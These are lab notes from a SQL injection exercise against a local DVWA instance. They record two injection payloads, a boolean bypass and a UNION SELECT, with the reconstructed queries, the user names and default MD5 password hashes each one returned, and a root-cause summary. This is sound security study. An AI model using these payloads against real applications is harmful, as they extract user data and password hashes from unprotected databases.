# SQL Injection Notes — DVWA (Low Security)

## Environment
- Target: DVWA (Damn Vulnerable Web Application), running locally
- Security Level: Low
- Module: SQL Injection
- URL: `http://localhost/dvwa/vulnerabilities/sqli/`
- Tested only on local, self-hosted instance — no external systems touched

---

## Payload Log

### Payload #1
- **Input:** `' OR '1'='1`
- **Field:** User ID
- **Resulting query (reconstructed):**
  ```sql
  SELECT first_name, last_name FROM users WHERE user_id = '' OR '1'='1';
  ```
- **Actual result (from live test):** Returned first/last names for **all 5 users** in the `users` table instead of a single requested user:
  - admin / admin
  - Gordon / Brown
  - Hack / Me
  - Pablo / Picasso
  - Bob / Smith
- **Data exposed:** Full list of all user first/last names in the database.
![alt text](payload1_or_11-1.png)
---

### Payload #2
- **Input:** `' UNION SELECT user, password FROM users-- -`
- **Field:** User ID
- **Resulting query (reconstructed):**
  ```sql
  SELECT first_name, last_name FROM users WHERE user_id = ''
  UNION SELECT user, password FROM users-- -';
  ```
- **Actual result (from live test):** The UNION SELECT appended a second query onto the original, returning usernames and MD5 password hashes instead of first/last names:
  - admin / 5f4dcc3b5aa765d61d8327deb882cf99
  - gordonb / e99a18c428cb38d5f260853678922e03
  - 1337 / 8d3533d75ae2c3966d7e0d4fcc69216b
  - pablo / 0d107d09f5bbe40cade3de5c71e9e9b7
  - smithy / 5f4dcc3b5aa765d61d8327deb882cf99
- **Data exposed:** Usernames and their password hashes (MD5) directly from the database. Note that `admin` and `smithy` share the same hash (`5f4dcc3b5aa765d61d8327deb882cf99`), which is the well-known MD5 hash of the string "password" — showing both accounts use the same weak password.
- **Screenshot:** `screenshots/payload2_union_select.png`

---
---

## Analysis Summary

| Payload | Technique | Data Exposed | Severity |
|---|---|---|---|
| `' OR '1'='1` | Boolean-based filter bypass | All rows' first/last names | High |
| `' UNION SELECT user, password FROM users-- -` | UNION-based data extraction | Usernames + password hashes | Critical |

## Root Cause
DVWA's Low-security SQL Injection page concatenates the raw `id` GET parameter directly into a SQL query string with no sanitization, no input validation, and no parameterized queries. Any SQL syntax typed into the input field is executed as part of the query.

